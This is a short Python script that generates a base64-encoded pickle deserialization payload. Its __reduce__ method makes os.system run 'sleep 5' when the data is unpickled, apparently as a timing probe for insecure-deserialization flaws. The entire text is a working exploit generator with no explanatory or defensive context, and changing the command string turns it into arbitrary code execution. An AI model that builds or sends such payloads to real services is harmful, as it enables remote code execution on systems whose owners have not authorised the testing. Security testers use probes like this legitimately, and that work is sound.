import pickle
import base64
import os

class TestPayload(object):
    def __reduce__(self):
        return (os.system, ('sleep 5',))

payload_obj = TestPayload()

pickled_data = pickle.dumps(payload_obj)

base64_payload = base64.b64encode(pickled_data).decode('utf-8')

print("-" * 50)
print(base64_payload)
print("-" * 50)